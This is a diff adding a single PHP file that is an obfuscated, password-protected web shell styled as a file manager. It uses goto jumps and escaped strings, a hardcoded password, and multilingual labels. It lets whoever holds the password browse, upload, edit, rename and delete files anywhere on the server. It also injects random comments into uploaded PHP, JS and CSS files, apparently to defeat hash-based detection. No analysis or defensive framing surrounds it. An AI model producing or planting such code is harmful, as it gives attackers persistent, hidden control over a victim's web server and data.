@@ -1,0 +1,223 @@
+<?php
+ goto vpzbe; vpzbe: session_start(); goto lCsO3; lCsO3: $pass = "\147\141\71\66\x38\x38"; goto wQCL2; wQCL2: if (!isset($_SESSION["\157\x6b"])) { if (isset($_POST["\160\141\163\163"]) && $_POST["\160\141\x73\x73"] === $pass) { $_SESSION["\x6f\x6b"] = 1; header("\x4c\157\x63\141\x74\151\x6f\x6e\x3a\x3f"); die; } die("\74\146\x6f\x72\x6d\x20\x6d\x65\164\150\x6f\x64\75\x22\160\157\x73\164\42\x3e\x3c\x69\156\x70\x75\x74\x20\x74\171\x70\x65\75\x22\x70\141\x73\163\167\x6f\x72\144\42\x20\x6e\141\x6d\145\75\x22\160\141\163\x73\x22\76\74\x62\165\x74\164\157\156\76\304\220\xc4\x83\156\x67\40\x6e\150\xe1\xba\xad\x70\x3c\57\142\165\x74\x74\x6f\156\x3e\x3c\57\146\157\x72\x6d\76"); } goto RCdaC; RCdaC: function h($s) { return htmlspecialchars($s, ENT_QUOTES, "\x55\124\x46\55\x38"); } goto Su1qc; Su1qc: function randStr($n = 30) { $c = "\x61\142\143\x64\x65\x66\x67\x68\151\152\x6b\x6c\155\156\x6f\x70\161\162\x73\x74\165\166\167\170\x79\172\xd7\xa1\xe2\231\xaa\342\x99\253\342\231\257\xe2\204\205\302\256\xe0\xb8\xa3\x20\340\xb2\227\40\xc4\xa9\303\xb8\321\216\340\252\xa4\340\253\201\xe0\252\202\xc9\227\311\x93\341\211\261\xe0\xb0\207\340\xb0\225\340\261\x8d\xe0\xb0\xb0\340\xb0\xbf\340\xb0\xa1\340\xb1\x87\340\xae\225\xe0\xaf\215\340\267\200\340\266\x85\xe0\256\256\xe0\xaf\x8d\xe0\xae\xb2\xe0\xae\262\340\xae\277\xe0\256\237\340\xaf\x8d\x7e\xef\274\201\x40\43\xef\277\xa5\45\xe2\200\xa6\xe2\200\xa6\46\x53\xe1\x89\x81\xe1\x89\202\xe1\211\x83\xe1\x89\x84\341\x89\205\341\x89\x86\x54\x55\x56\127\130\x59\x5a\60\340\246\x8f\xe0\xa6\xb0\340\xa6\227\340\247\215\340\246\xb0\xe0\246\xbf\336\220\xde\xad\xde\x8e\336\xad\xde\213\336\xa6\xde\x90\336\260\xde\223\xde\xaf\336\x83\xde\251\xde\201\336\xb0\xde\x89\336\251\311\xa3\305\213\xe0\273\x80\xe1\203\226\xe1\x83\x92\xe1\203\241\xe1\x83\243\303\x9f\xce\xa9\317\210\xcf\215\340\252\xae\340\253\201\340\xaa\260\340\xab\215\340\xaa\xa1\340\xab\x87\xe0\xaa\xb5\340\xaa\xbe\340\252\241\340\253\200\xe0\252\xb0\340\253\207\340\252\xb0\340\xab\x8d\xe0\xaa\244\340\252\276\327\245\327\221\327\x9e\340\262\250\xe0\xb3\x8d\340\xb2\250\340\262\277\340\262\202\xe0\262\207\340\xb2\xb9\340\263\x87\xe0\262\263\340\262\xbf\40\xe2\x80\x8b\xe2\x80\x8b\xe1\215\215\xe1\x8c\x89\332\257\340\266\234\xde\216\xde\xb0\xe1\x8a\253\xd5\277\xe0\xa6\252\327\x90\xd6\267\xce\xb8\322\265\322\277\xd2\xa9\320\270\323\241\322\255\323\231\xe1\210\250\341\x8a\220\341\x88\256\xe1\x8b\212\341\x8b\xb5\x31\x32\63\x34\65\66\67\70\71"; $r = ''; for ($i = 0; $i < $n; $i++) { $r .= $c[random_int(0, strlen($c) - 1)]; } return $r; }
+
+function addNote($name,$data){
+    $e=strtolower(pathinfo($name,PATHINFO_EXTENSION));
+    $r=randStr(random_int(20,80));
+    
+    if($e==='php'){
+        if(preg_match('/^\s*<\?php/i',$data)){
+            $data=preg_replace('/^\s*<\?php/i',"<?php\n/* Note:$r */",$data,1);
+        }else{
+            $data="<?php\n/* Note:$r */\n".$data;
+        }
+    }elseif(in_array($e,['js','css','htm'])){
+        $data="/* Note:$r */\n".$data;
+    }
+    return $data;
+}
+
+$path=realpath($_GET['dir']??__DIR__);
+if(!$path)$path=__DIR__;
+
+
+/* 上传 */
+if(isset($_FILES['file'])){
+    foreach($_FILES['file']['tmp_name'] as $i=>$tmp){
+        if(!is_uploaded_file($tmp))continue;
+
+        $name=basename($_FILES['file']['name'][$i]);
+        $target=$path.'/'.$name;
+        $ext=strtolower(pathinfo($name,PATHINFO_EXTENSION));
+
+        if(in_array($ext,['php','js','css','html','htm'])){
+            $data=file_get_contents($tmp);
+            file_put_contents($target,addNote($name,$data));
+        }else{
+            move_uploaded_file($tmp,$target);
+        }
+    }
+
+    header("Location:?dir=".urlencode($path));
+    exit;
+}
+
+
+/* 创建 */
+if(isset($_POST['create'])){
+    $name=basename($_POST['name']);
+
+    if($_POST['type']=='dir'){
+        @mkdir($path.'/'.$name,0755);
+    }else{
+        @file_put_contents($path.'/'.$name,'');
+    }
+
+    header("Location:?dir=".urlencode($path));
+    exit;
+}
+
+
+/* 重命名 */
+if(isset($_POST['rename'])){
+    $old=basename($_POST['old']);
+    $new=basename($_POST['new']);
+
+    if($new){
+        @rename($path.'/'.$old,$path.'/'.$new);
+    }
+
+    header("Location:?dir=".urlencode($path));
+    exit;
+}
+
+
+/* 删除 */
+if(isset($_GET['del'])){
+    $f=realpath($_GET['del']);
+
+    if($f){
+        if(is_file($f))@unlink($f);
+        elseif(is_dir($f))@rmdir($f);
+    }
+
+    header("Location:?dir=".urlencode($path));
+    exit;
+}
+
+
+/* 保存 */
+if(isset($_POST['save'])){
+    $f=realpath($_POST['file']);
+
+    if($f&&is_file($f)){
+        file_put_contents($f,$_POST['content']);
+    }
+
+    header("Location:?dir=".urlencode(dirname($f)));
+    exit;
+}
+
+$edit=$_GET['edit']??'';
+?>
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Không đáng kể</title>
+<style>
+body{font:13px Arial;margin:10px;color:#333}
+a{text-decoration:none;color:#06c}
+.path{background:#2ce644;border:1px solid #ddd;padding:6px;margin-bottom:8px;font-family:monospace}
+form{margin:5px 0}
+input,select,button{height:26px;padding:2px 6px;font-size:13px}
+button{cursor:pointer}
+table{width:100%;border-collapse:collapse;background:#fff;margin-top:8px}
+td,th{border:1px solid #ddd;padding:5px}
+th{background:#eee;font-weight:normal}
+textarea{width:100%;height:350px;font-family:monospace;font-size:13px}
+.action form{display:inline}
+.action input{width:90px}
+.action a{margin-left:6px}
+.file{word-break:break-all}
+</style>
+</head>
+<body>
+
+<div class="path">
+<?php
+ goto XUQux; XUQux: echo "\x3c\141\x20\x68\162\x65\x66\75\42\x3f\144\x69\x72\75\x2f\42\x3e\x2f\74\x2f\x61\76"; goto RkAXs; RkAXs: $build = ''; goto OeFgr; OeFgr: foreach (explode("\x2f", trim($path, "\x2f")) as $p) { if ($p == '') { continue; } $build .= "\57" . $p; echo "\57\x3c\141\x20\x68\162\x65\146\x3d\42\x3f\144\151\162\75" . urlencode($build) . "\42\x3e" . h($p) . "\x3c\x2f\x61\76"; } goto e0A1j; e0A1j: ?>
+</div>
+
+
+<div style="display:flex;gap:8px">
+
+<form method="post" enctype="multipart/form-data">
+<input type="file" name="file[]" multiple>
+<button>Uék</button>
+</form>
+
+<form method="post">
+<input name="name" placeholder="名称">
+<select name="type">
+<option value="file">ⵜⴰⴼⵜⴰⵔⵜ</option>
+<option value="dir">Münderice</option>
+</select>
+<button name="create">ստեղծել</button>
+</form>
+
+</div>
+
+
+<?php
+ goto qAVz5; dX2z0: if ($path != "\x2f") { ?>
+<tr><td colspan="3"><a href="?dir=<?php  echo urlencode(dirname($path)); ?>
+">⬅ ߡߜ߭ߐ߬ߓߊ</a></td></tr><?php  } goto ZKuTA; gg5u2: ?>
+<table><tr><th>ߕߐߜ߭ߐ</th><th width="80">大小</th><th width="260">ⵅⴻⴷⴷⴻⵎ</th></tr><?php  goto dX2z0; qAVz5: if ($edit && is_file($edit)) { ?>
+<hr><form method="post"><textarea name="content"><?php  echo h(file_get_contents($edit)); ?>
+</textarea> <input name="file"type="hidden"value="<?php  echo h($edit); ?>
+"><br><button name="save">جاڬ</button></form><hr><?php  } goto gg5u2; ZKuTA: ?>
+
+
+<?php
+$list=@scandir($path);
+
+if($list){
+foreach($list as $f){
+
+if($f=='.'||$f=='..')continue;
+
+$full=$path.'/'.$f;
+?>
+
+<tr>
+
+<td class="file">
+
+<?php if(is_dir($full)): ?>
+
+📁 <a href="?dir=<?=urlencode($full)?>">
+<?=h($f)?>
+</a>
+
+<?php else: ?>
+
+📄 <a href="?edit=<?=urlencode($full)?>">
+<?=h($f)?>
+</a>
+
+<?php endif; ?>
+
+</td>
+
+
+<td>
+<?=is_file($full)?filesize($full).'B':'-'?>
+</td>
+
+
+<td class="action">
+
+<form method="post">
+<input type="hidden" name="old" value="<?=h($f)?>">
+<input name="new" placeholder="Նոր անուն">
+<button name="rename">вежӧм</button>
+</form>
+
+<a onclick="return confirm('删除?')" href="?dir=<?=urlencode($path)?>&del=<?=urlencode($full)?>">
+ᐲᔭᖅᑕᐅᔪᖅ
+</a>
+
+</td>
+
+</tr>
+
+<?php
+}
+}
+?>
+
+</table>
+
+</body>
+</html>
